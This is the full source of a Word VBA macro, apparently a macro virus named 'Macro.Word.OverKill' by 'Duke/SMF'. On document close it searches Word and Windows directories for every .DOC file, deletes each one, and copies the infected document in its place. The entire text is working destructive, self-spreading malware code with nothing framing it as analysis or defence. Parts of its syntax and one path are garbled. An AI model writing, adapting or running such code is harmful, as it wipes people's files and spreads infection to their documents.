   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoClose"

   Public Sub MAIN()
   Dim size_
   Dim count_
   'This is Macro.Word.OverKill (c) by Duke/SMF
   WordBasic.FileFind SearchPath:=" C:\??? ?????????; C:\WINWORD; C:\WINDOWS; C:\WIN95", Name:="*.DOC", SubDir:=1
   size_ = WordBasic.CountFoundFiles()
   If size_ >= 1 Then
       For count_ = 1 To size_
           WordBasic.Kill WordBasic.[FoundFileName$](count_)
           WordBasic.CopyFile FileName := WordBasic.[FileName$](),
           ,Directory = WordBasic.[FoundFileName$](count_)
           Next
   End If
   End Sub
